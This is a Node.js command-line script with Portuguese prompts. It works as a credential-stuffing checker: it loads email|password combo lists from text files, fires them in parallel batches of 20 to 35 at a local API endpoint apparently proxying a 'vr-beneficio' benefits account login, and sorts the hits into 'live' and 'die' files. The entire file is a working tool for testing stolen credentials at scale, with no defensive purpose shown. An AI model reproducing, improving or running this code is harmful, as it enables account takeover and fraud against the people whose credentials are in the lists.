const request = require('request');
const { MultiSelect, Select, Input } = require('enquirer');
const fs = require("fs");
const path = require("path");
const colors = require('colors');

let list = [];

//function curl

function __curl($options) {
  return new Promise((resolve, reject) => {
      request($options, (err, res, body) => {
          resolve({ err: err, res: res, body: body })
      })
  })
}

//(Login init)
const login = async (params) => {
//(try)
  try {
  //(lista)
  var [email, senha] = params.trim().split(`|`);
//(original_dynamic)
var paypal_VERIFICA = await __curl({
  url: `https://localhost/dashboard/web/2022/clientes/vr-beneficio/api.php?lista=${email}|${senha}`,
  method: "GET",
  rejectUnauthorized: false,
  headers: {

  }
});

  if (paypal_VERIFICA.body.includes('Live:')){
    console.log(`${paypal_VERIFICA.body}`.green);
    if (list.length !== 0) login(list.shift());
    return fs.appendFileSync("Aprovadas/live.txt", `${paypal_VERIFICA.body}\n`);
   }

  else if (paypal_VERIFICA.body.includes('Error:')){
    console.log(`${paypal_VERIFICA.body}`.red);
    return fs.appendFileSync("Reprovadas/erro.txt", `${paypal_VERIFICA.body}\n`);
  }

  else{
    if (list.length !== 0) login(list.shift());
    console.log(`${paypal_VERIFICA.body}`.red);
    return fs.appendFileSync("Reprovadas/die.txt", `${paypal_VERIFICA.body}\n`);
  }

}

catch (e) {
  if (list.length !== 0) login(list.shift());
  console.log(`${params}|${e}`.red);
  return fs.appendFileSync("erros.txt", `${params}|${e}\n`);

}

}

const init = async () => {
const velocidade = await new Select({
  prefix: '        ',
  separator: '?',
  name: 'contents',
  message: 'Escolha Quantos Threads',
  choices: ['20','30', '35'],
  indicator(state, choice) {
    if (choice.enabled) {
      return '[X]';
    }
    return '[ ]';
  },
  onSubmit() {
    if (this.selected.length === 0) {
      this.enable(this.focused);
    }
  }
}).run();
  const lists = fs.readdirSync(path.join(__dirname, './')).filter(value => value.endsWith('.txt') && !value.includes('cookie_') && !value.includes('cookie_') && !value.includes('live_saldo_baixo') && !value.includes('proxy')  && !value.includes('die') && !value.includes('erros') && !value.includes('live') && !value.includes('live_saldo_alto') && !value.includes('read')).map((value, index) => { return { name: value, value }; });
  if (lists.length < 1) {
    console.log();
    console.log('Você não possuí nenhuma lista válida no diretorio atual!')
    return process.exit(1);
  }

  const contents = await new MultiSelect({
    prefix: '        ',
    separator: '?',
    name: 'contents',
    message: 'Qual lista deseja carregar ?',
    choices: lists,
    indicator(state, choice) {
      if (choice.enabled) {
        return '[X]';
      }
      return '[ ]';
    },
    onSubmit() {
      if (this.selected.length === 0) {
        this.enable(this.focused);
      }
    }
  }).run();

  list = contents.map(value => fs.readFileSync('./' + value, { encoding: 'utf-8' })).join('\n').split('\n');

  if (list.length < 1) {
    console.log();
    console.log(contents.length == 1 ? '' : 's' + contents.join(', '));
    return process.exit(1);
  }

  console.log('\n', `${list.length} dado${list.length == 1 ? '' : 's'} carregados...`);

  for (const linha of list.splice(0, `${velocidade}`)) {
    login(linha);
  }
}

init();